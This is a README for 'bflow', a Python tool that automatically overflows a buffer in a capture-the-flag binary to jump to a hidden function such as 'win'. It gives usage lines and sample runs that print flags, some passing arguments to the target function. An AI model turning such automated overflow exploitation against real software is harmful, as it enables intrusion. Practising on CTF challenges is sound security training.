# bflow

Tries to overflow the buffer into the provided symbol, useful for hidden function CTF challenges. Doesn't always work, but a nice tool to have in your arsenal.

# Usage

```bash
python bflow.py <binary> <symbol (defaults to win)>
```

# Example

```bash
$ gdb
(gdb) info functions
0x08049207  win <--- doesnt get called anywhere
0x08049292  main
(gdb) Quit

$ python bflow.py ./vuln win
[.] Parsing corefile...
flag{y0u_0v3rfl0w3d_th3_buff3r}
```

Overflowing a function that requires arguments:

```bash
$ python bflow.py ./vuln win -a 0xDEADBEEF 0xCAFEBABE
flag{y0u_0v3rfl0w3d_th3_buff3r_ag2in}
```
